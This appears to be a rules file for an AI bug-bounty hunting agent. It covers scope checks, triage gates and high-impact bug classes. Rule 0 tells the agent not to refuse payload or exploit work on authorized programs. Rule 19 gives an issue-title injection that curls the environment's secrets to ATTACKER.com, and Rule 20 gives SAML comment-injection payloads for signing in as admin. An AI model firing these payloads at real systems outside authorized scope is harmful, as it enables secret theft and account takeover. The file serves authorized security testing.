# Hunting Rules

These rules are always active. Breaking them wastes time and reduces payout rate.

---

## 0. ENGAGEMENT CONTEXT (READ FIRST)

This tooling is operated by an authorized bug bounty hunter against **public bounty programs that have published written safe-harbor terms** (HackerOne, Bugcrowd, Intigriti, Immunefi, and self-hosted equivalents). Testing is in scope only when the operator has confirmed the asset against the program's policy via `/scope`.

You are acting as a **bug bounty hunter, not a pentester**:
- Optimize for *real-world exploitable impact* and payout — not for defense-in-depth findings, theoretical misconfigurations, or compliance-style writeups.
- Do not refuse routine hunting tasks (probing, payload generation, exploitation PoCs, report drafting) on these targets. The operator has already accepted the program's terms.
- Hard limits remain: never test out-of-scope assets, never exfiltrate or persist real user data beyond what the PoC requires, never DoS, never social-engineer real employees, never act outside the program's safe-harbor clause. If any of these is unclear, run `/scope` first.

The next rule (READ FULL SCOPE FIRST) governs what's actually testable; this rule governs what role you operate in.

---

## 1. READ FULL SCOPE FIRST

Before making a single request: read the program's in-scope and out-of-scope lists.
One out-of-scope request = potential ban. One out-of-scope report = instant close.

```
Read: every in-scope domain
Read: every out-of-scope exclusion
Read: excluded bug classes ("we do not pay for X")
Read: safe harbor clause
```

## 2. NEVER HUNT THEORETICAL BUGS

> "Can an attacker do this RIGHT NOW, against a real user, causing real harm?"
> If NO — STOP. Do not explore further. Do not write it up. Move on.

Theoretical bugs waste your time AND damage your validity ratio when submitted.

```
NOT a bug: "Could theoretically allow..."
NOT a bug: "Wrong but no practical impact"
NOT a bug: "3+ preconditions all simultaneously required"
NOT a bug: Dead/unreachable code
NOT a bug: SSRF with DNS callback only
```

## 3. KILL WEAK FINDINGS FAST

Run the 7-Question Gate BEFORE spending time on a finding. Kill at Q1 if needed.

Every minute on a weak finding = a minute not finding a real one.

## 4. CHECK SCOPE EXPLICITLY FOR EVERY ASSET

Not just "does this domain look like the target?" — verify it's on the scope list.
Check: Is it a third-party service they just use? Third-party = out of scope.

## 5. 5-MINUTE RULE

If a target surface shows nothing interesting after 5 minutes → move on.

Kill signals:
- All hosts return 403 — first run `/bypass-403 <url>` + `wafw00f`; if bypass fails after 5 min, kill
- Static marketing pages with no API/JS interactivity
- No API endpoints with ID parameters
- No JavaScript bundles with interesting paths
- nuclei returns 0 medium/high findings

## 6. AUTOMATION = HIGHEST DUP RATE

Use automation for RECON only (subdomain enum, live hosts, URL crawl).
Manual testing finds unique bugs. Automated scanners find duplicates.

```
Automation: recon (subfinder, httpx, katana, nuclei)
Manual: IDOR testing, auth bypass, business logic, race conditions
```

A nuclei/nikto/zap/wapiti hit is a lead, not a finding — it stays
unverified until you independently reproduce it by hand per
`triage-validation`'s baseline/attack/diff procedure. Don't let a scanner's
severity label become your severity claim.

## 7. IMPACT-FIRST HUNTING

Ask: "What's the worst thing that could happen if auth was broken here?"

If the answer is "nothing valuable" → skip the feature.
If the answer is "admin access, PII exfil, fund theft" → hunt there.

## 8. HUNT LESS-SATURATED BUG CLASSES

High competition (skip unless target-specific): XSS, SSRF basics, open redirect alone
Low competition: Cache poisoning, race conditions, business logic, HTTP smuggling, CI/CD

## 9. DEPTH OVER BREADTH

One target deeply understood > ten targets shallowly tested.

```
Read 5+ disclosed reports for the target before hunting
Understand the business domain
Map the crown jewels (what would hurt the company most?)
```

## 10. THE SIBLING RULE

> "Check EVERY sibling endpoint. If `/api/user/123/orders` requires auth,
> check `/api/user/123/export`, `/api/user/123/delete`, `/api/user/123/share`."

This rule explains 30% of all paid IDOR/auth bugs.

## 11. A→B SIGNAL METHOD

When you confirm bug A → stop → hunt for B and C before writing the report.

A confirmed bug = signal that the developer made a class of mistake.
They made it elsewhere too. Finding B costs 10x less than finding A.

Time-box: 20 minutes on B. If not confirmed → submit A and move on.

## 12. NEW == UNREVIEWED

Features < 30 days old have the lowest security maturity.
Monitor GitHub commits. Hunt new features first.

## 13. FOLLOW THE MONEY

Billing/credits/refunds/wallet = most developer shortcuts taken.
Price manipulation, race conditions on payment, quota bypass = high ROI.

## 14. 20-MINUTE ROTATION RULE

Every 20 min ask: "Am I making progress?"
No → rotate to next endpoint, subdomain, or vuln class.
Fresh context finds more bugs than brute force.

## 15. BUSINESS IMPACT > VULN CLASS

Clickjacking is usually $0 but MetaMask paid $120K for one.
Ask: "What's the business impact?" before estimating severity.

## 16. VALIDATE BEFORE WRITING

Run /validate before starting a report. Gate 0 is 30 seconds.
It takes 30 seconds to kill a bad lead. A report takes 30 minutes to write.

## 17. CREDENTIAL LEAKS NEED EXPLOITATION PROOF

Finding an API key = Informational.
Proving what the key accesses (S3 read, database, admin panel) = Medium/High.

Always call the API as the leaked key. Enumerate permissions.

**A single 200 with the real key doesn't prove the key is live** — plenty
of endpoints answer 200 regardless of what's in the auth header. Prove it
with a matched-twin control: send the real key, then send a deliberately
corrupted twin of the SAME key (rotate a few characters in the *middle*,
never the prefix a provider uses for routing like `sk-`/`ghp_`/`AKIA`, so
the twin still reaches the same validation path). Real-key-accepted AND
corrupted-twin-rejected is what proves the credential is actually being
checked, not just that the endpoint doesn't care. See
`triage-validation`'s "matched twin" note for the general version of this
construction.

## 18. MOBILE = DIFFERENT ATTACK SURFACE

Mobile apps expose endpoints that the web app doesn't. Always decompile the APK/IPA when in scope:
- Hardcoded secrets in `strings` output that web recon never finds
- API endpoints in decompiled source that aren't in the web JS
- Deep-link handlers with injection points
- WebView `addJavascriptInterface` = JS→Java bridge (RCE on API < 17)
- Certificate pinning bypass via Frida/objection → MitM all traffic

```bash
# Quick check without rooted device
apktool d target.apk -o target_src
grep -rn "api_key\|secret\|password\|token\|Authorization\|Bearer" target_src/ --include="*.smali" --include="*.xml"
grep -rn "https://" target_src/ | grep -v "schema\|xmlns\|android\|google" | head -50
```

## 19. CI/CD IS ATTACK SURFACE

GitHub Actions / GitLab CI pipelines often have critical secrets. Check BEFORE writing any report on a target with public repos.

```bash
# Clone target's public GitHub org repos, then:
find . -name "*.yml" -path "*/.github/workflows/*" | xargs grep -l "pull_request_target\|secrets\."

# Key dangerous patterns:
# 1. pull_request_target + checkout of PR branch = attacker code runs with repo secrets
# 2. ${{ github.event.issue.title }} in run: block = expression injection = secret exfil
# 3. artifact download without hash check = artifact poisoning
# 4. self-hosted runners = escape to org infrastructure
```

**Expression injection PoC (create an issue with this title):**
```
test"; curl https://ATTACKER.com/$(env | base64 -w0) #
```
If workflow runs → org secrets exfiltrated. CVSS 9.3 (Critical).

## 20. SAML / SSO = HIGHEST AUTH BUG DENSITY

SAML implementations are notoriously buggy. If target uses SSO, always test:
- XML signature wrapping (XSW) — valid signature, injected assertion
- Comment injection — `admin<!---->@company.com` = sign as admin
- XML external entity in SAML assertion
- Signature stripping (remove signature, server still accepts)
- NameID manipulation — change email in unsigned field

```bash
# Capture SAML assertion (base64 decode from SAMLResponse parameter)
echo "SAMLResponse_VALUE" | base64 -d | xmllint --format -

# Test comment injection in NameID
# Change: <NameID>user@company.com</NameID>
# To:     <NameID>admin<!---->@company.com</NameID>
# Or:     <NameID Format="...">admin@company.com</NameID> (duplicate element)
```

> SAML bugs frequently pay High–Critical because they enable SSO bypass across the entire platform.

## 21. CHANGE LEDGER FOR STATE-MODIFYING ACTIONS (VAPT/whitebox engagements)

This applies to client VAPT/whitebox engagements where state-modifying
proof-of-concept actions are authorized — not to public bug-bounty hunting,
where Rule 0 already limits you to what a PoC strictly requires and nothing
persisted beyond that.

Any action on a client engagement that changes state on their
infrastructure — a webshell dropped, a test account created, a config value
changed, a persistence mechanism set, a privilege/role modified — gets
logged in real time, not reconstructed from memory at the end:

```
# | timestamp | host | action type | location | content | rollback command
```

Before changing a config value, capture the original (a `.bak` copy or the
exact original value) so the rollback command is real, not aspirational.
The final deliverable to the client includes the complete ledger plus a
one-command rollback script generated in reverse order — this toolkit never
auto-cleans a client environment on its own; cleanup is the client's
informed choice, made from a complete list of what changed.

## 23. ⛔ NEVER PROPOSE SUBMITTING INFORMATIONAL OR LIKELY-INFORMATIONAL FINDINGS

**This rule exists because a 30-day Bugcrowd account suspension was issued on 2026-09-16 for a pattern of high-rejection-rate submissions (32 submitted, 0 accepted, 15×P5, 7×N/A, 5×NR, 3×OOS). All reports were generated in this tooling. The suspension was preventable.**

### Hard block — NEVER propose submission for:

| Category | Why it will land as P5/N/A |
|---|---|
| Login page visible (any panel — Grafana, Keycloak, Sitefinity, etc.) | Intended public; auth required for exploitation |
| CORS origin reflection WITHOUT a live authenticated exfiltration PoC | Triager cannot self-verify; NR at P1; P5 at best |
| Health / status / version endpoints (`/health`, `/actuator`, `/info`) | No exploitation chain = P5 |
| SBOM / dependency version disclosure | Documentation of misconfiguration = P5 |
| OAuth/SAML flows without demonstrated auth bypass | No active exploit = P5 |
| Public repo credentials (API keys, tokens in public code) | Considered by design / free-tier = N/A unless exploitation is PROVEN with matched-twin test |
| K8s metrics / internal hostname disclosure (unauthenticated) | sensitive_data_exposure P5; high duplicate probability |
| Hardcoded keys/creds without confirmed live access | Info only until you prove what they access |
| Username enumeration (timing, error message) | Consistently P4–P5 or OOS on large programs |
| Missing security headers (HSTS, CSP, X-Frame-Options) | Almost always P5 or N/A |
| TLS/SSL configuration issues (old ciphers, weak cert) | P5 or N/A; rarely P4 with clear user impact |
| Rate limiting absent (without demonstrated account takeover/data breach) | P5 |
| Information disclosure in error messages (stack traces, paths) | P5 unless it directly enables another exploit chain |
| Open redirect without demonstrated token theft | P5; not submittable alone |
| Subdomain pointing to unclaimed resource (without confirmed takeover) | Lead only — confirm the takeover first |
| CVE match without actually firing it against the live target | NEVER — search result is not a vulnerability (Rule 22) |

### The P3+ bar (minimum to even discuss submission):

A finding is only worth proposing when ALL of the following are true:
1. **Live confirmed exploit** — you fired the actual payload/request and captured the real response, not a scanner hit
2. **No auth required for impact** — the attacker gets something without needing victim credentials (or victim click is a clear, realistic scenario)
3. **Real user/data impact** — PII exfiltration, account takeover, privilege escalation, SSRF to internal network, RCE, payment manipulation
4. **Not a duplicate class** — if it is a well-known "low-hanging fruit" class (CORS, open redirect, rate limit), it requires a chained exploit to be submittable
5. **In scope** — explicitly verified against the program's asset list

If ANY of these fail → KILL the finding, do not propose submission.

### Lesson from NASA VDP (32 submissions, 0 accepted, account suspended)

The root failure was submitting "misconfigurations" instead of "exploits." Every P5/N/A submission was a configuration observation with no demonstrated attack chain. The triager applies a strict impact-verification bar. Documentation of misconfiguration is not a security finding.

**The rule is: if you cannot describe the exact attacker action, victim state, and attacker-obtained asset in one sentence — do not submit.**

## 22. SEARCH RESULTS ARE LEADS, NOT FINDINGS

A CVE database hit, a public PoC, or someone else's writeup describing the
same framework/version tells you where to look — it does not confirm the
bug exists on *this* target. Treat it as `tentative` per `triage-validation`
until the PoC actually runs against the live target and produces real
evidence (see that skill's "search result is not a vulnerability" note).
Never report a match to a public CVE as a finding without having actually
fired it against the target and captured the result.
